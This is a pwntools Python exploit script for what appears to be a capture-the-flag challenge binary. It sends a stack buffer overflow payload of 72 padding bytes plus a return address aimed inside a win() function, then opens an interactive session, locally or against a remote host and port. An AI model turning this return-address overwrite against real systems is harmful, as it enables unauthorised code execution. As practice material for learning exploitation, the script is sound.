#!/usr/bin/python3
from pwn import *
import sys
FILENAME = "./src/chal"
context.log_level = "debug"
context.terminal = ["wt.exe", "wsl.exe"]
context.arch = "amd64"
exe = context.binary = ELF(FILENAME)

if len(sys.argv) == 1:
    r = process(FILENAME)
    if args.GDB:
        gdb.attach(r)
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)

# 0x40126a is the address of win() + 8, which is the instruction after the function prologue in win()
# payload = b'A' * 72 + p64(exe.symbols["win"] + 8) is equivalent to payload = b'A' * 72 + p64(0x40126a)
payload = b'A' * 72 + p64(0x40126a)

r.recvuntil(b"Input your data: ")
r.sendline(payload)

r.interactive()